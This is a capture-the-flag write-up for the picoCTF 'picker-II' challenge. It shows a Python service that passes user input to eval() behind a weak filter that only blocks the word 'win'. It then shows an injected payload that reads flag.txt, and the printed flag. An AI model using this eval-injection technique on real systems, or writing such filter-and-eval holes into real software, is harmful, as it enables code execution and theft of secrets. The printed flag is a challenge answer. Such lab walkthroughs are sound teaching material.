Download file:

```commandline
┌──(stupidhacker㉿kali)-[~/Downloads/pico/tmp]
└─$ wget https://artifacts.picoctf.net/c/521/picker-II.py                        
--2023-11-17 12:50:41--  https://artifacts.picoctf.net/c/521/picker-II.py
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 108.157.30.81, 108.157.30.86, 108.157.30.63, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|108.157.30.81|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3500 (3.4K) [application/octet-stream]
Saving to: ‘picker-II.py’

picker-II.py                                               100%[=======================================================================================================================================>]   3.42K  --.-KB/s    in 0s      

2023-11-17 12:50:42 (99.5 MB/s) - ‘picker-II.py’ saved [3500/3500]
```

Pay attention to the following codes in the downloaded file:

```python
def getRandomNumber():
    print(4)  # Chosen by fair die roll.
    # Guaranteed to be random.
    # (See XKCD)


def win():
    # This line will not work locally unless you create your own 'flag.txt' in
    #   the same directory as this script
    flag = open('flag.txt', 'r').read()
    # flag = flag[:-1]
    flag = flag.strip()
    str_flag = ''
    for c in flag:
        str_flag += str(hex(ord(c))) + ' '
    print(str_flag)
```

```python
def filter(user_input):
    if 'win' in user_input:
        return False
    return True


while (True):
    try:
        user_input = input('==> ')
        if (filter(user_input)):
            eval(user_input + '()')
        else:
            print('Illegal input')
    except Exception as e:
        print(e)
```

We can realize that the server prevent us from running ```win()```:
```commandline
┌──(stupidhacker㉿kali)-[~/Downloads/pico/tmp]
└─$ nc saturn.picoctf.net 63690
==> lose
name 'lose' is not defined
==> win
Illegal input
==> Win
name 'Win' is not defined
==> getRandomNumber
4
```
But we have another way to print the flag:
```commandline
┌──(stupidhacker㉿kali)-[~/Downloads/pico/tmp]
└─$ nc saturn.picoctf.net 63690
==> print(open('flag.txt', 'r').read()).print
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_b924e8e5}
'NoneType' object has no attribute 'print'
==>     
```